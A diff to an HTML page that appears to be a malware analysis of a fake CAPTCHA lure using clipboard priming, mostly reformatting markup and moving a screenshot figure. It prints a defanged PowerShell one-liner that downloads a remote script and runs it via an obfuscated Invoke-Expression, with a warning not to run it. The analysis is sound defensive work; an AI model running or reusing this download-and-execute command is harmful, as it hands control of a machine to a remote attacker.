@@ -287,24 +287,40 @@
                             action by the victim.</p>
 
                         <p><strong>Malware Payload</strong></p>
-                        <p>There are two payloads to analyze: (1) the behavior visible in the page’s inline JavaScript when
-                            inspected in the browser, and (2) the code embedded in the raw page source. Reviewing both helps
+                        <p>There are two payloads to analyze: (1) the behavior visible in the page’s inline JavaScript
+                            when
+                            inspected in the browser, and (2) the code embedded in the raw page source. Reviewing both
+                            helps
                             establish capabilities and the execution chain.</p>
 
-                        <p><em>Quick decode:</em> Using a URL decoder (for example, <a href="https://www.urldecoder.org/" rel="nofollow noopener noreferrer" target="_blank">urldecoder.org</a>) on the percent-encoded string reveals a PowerShell one‑liner that downloads and executes a remote script in memory. The decoded command resolves to the Invoke‑WebRequest alias with basic parsing, piped to Invoke‑Expression, e.g.:</p>
+                        <figure style="margin: 1.2em 0; text-align: center;">
+                            <img src="inspect.png"
+                                alt="Browser Inspect view showing inline JavaScript on the fake CAPTCHA page"
+                                style="max-width:100%; height:auto;">
+                            <figcaption style="font-size: 0.9em; color: #777;">Inspect (DevTools): inline JavaScript
+                                related to clipboard priming.</figcaption>
+                        </figure>
 
-                        <pre style="white-space: pre-wrap; background: #f7f7f7; padding: 0.6em 0.8em; border-radius: 4px; overflow:auto;"><code>wget -UseBasicParsing hxxps://diravo[.]com/dls.txt | i`ex</code></pre>
+                        <p><em>Quick decode:</em> Using a URL decoder (for example, <a
+                                href="https://www.urldecoder.org/" rel="nofollow noopener noreferrer"
+                                target="_blank">urldecoder.org</a>) on the percent-encoded string reveals a PowerShell
+                            one‑liner that downloads and executes a remote script in memory. The decoded command
+                            resolves to the Invoke‑WebRequest alias with basic parsing, piped to Invoke‑Expression,
+                            e.g.:</p>
+
+                        <pre
+                            style="white-space: pre-wrap; background: #f7f7f7; padding: 0.6em 0.8em; border-radius: 4px; overflow:auto;"><code>wget -UseBasicParsing hxxps://diravo[.]com/dls.txt | i`ex</code></pre>
 
                         <p>Meaning: fetch a script from the defanged URL and execute it. Do not run this.</p>
 
-                        <figure style="margin: 1.2em 0; text-align: center;">
-                            <img src="inspect.png" alt="Browser Inspect view showing inline JavaScript on the fake CAPTCHA page" style="max-width:100%; height:auto;">
-                            <figcaption style="font-size: 0.9em; color: #777;">Inspect (DevTools): inline JavaScript related to clipboard priming.</figcaption>
-                        </figure>
+
 
                         <figure style="margin: 1.2em 0; text-align: center;">
-                            <img src="page_source.png" alt="Page Source view highlighting the malicious script in the HTML" style="max-width:100%; height:auto;">
-                            <figcaption style="font-size: 0.9em; color: #777;">Page Source (<code>Ctrl+U</code>): embedded script revealing the payload path.</figcaption>
+                            <img src="page_source.png"
+                                alt="Page Source view highlighting the malicious script in the HTML"
+                                style="max-width:100%; height:auto;">
+                            <figcaption style="font-size: 0.9em; color: #777;">Page Source (<code>Ctrl+U</code>):
+                                embedded script revealing the payload path.</figcaption>
                         </figure>
 
 
